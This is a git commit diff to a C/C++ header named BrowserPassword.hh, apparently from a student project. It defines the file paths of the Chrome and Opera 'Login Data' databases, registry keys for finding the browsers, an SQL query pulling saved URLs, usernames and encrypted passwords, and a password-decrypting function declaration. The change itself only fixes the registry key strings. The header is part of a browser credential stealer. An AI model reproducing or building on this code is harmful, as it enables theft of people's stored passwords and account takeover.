86bb9b467b23a8e3f9a1dd15f277ba97cfae5166
Valentin Nasraty <valentin.nasraty@epitech.eu>
2018-11-14 11:03:28 +0100

    Update BrowserPassword.hh

--- src/BrowserPassword.hh
+++ src/BrowserPassword.hh
@@ -8,9 +8,9 @@
 #include <sqlite3.h>
 
 # define C_DBFILE "\\Google\\Chrome\\User Data\\Default\\Login Data" 
-# define C_REGKEY "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"
+# define C_REGKEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"
 # define O_DBFILE "\\Opera Software\\Opera Stable\\Login Data" 
-# define O_REGKEY "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\opera.exe"
+# define O_REGKEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\opera.exe"
 # define QUERY    "SELECT origin_url, username_value, length(password_value), password_value FROM logins"
 
 const char  *uncryptData(BYTE *password, int size);
